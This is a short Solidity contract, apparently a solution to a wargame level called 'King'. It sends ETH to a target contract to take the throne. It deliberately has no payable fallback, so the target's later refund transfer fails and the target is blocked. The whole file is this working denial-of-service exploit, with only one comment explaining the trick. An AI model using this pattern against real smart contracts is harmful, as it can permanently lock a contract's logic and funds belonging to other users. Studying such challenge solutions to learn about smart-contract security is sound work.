// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

/// @dev Do not create fallback payable functions so you will
/// block the transfer method of the King
contract HackKing {
    address king;

    constructor(address _king) {
        king = _king;
    }

    function blockReceive() external payable {
        (bool success,) = king.call{value: msg.value}("");
        require(success);
    }
}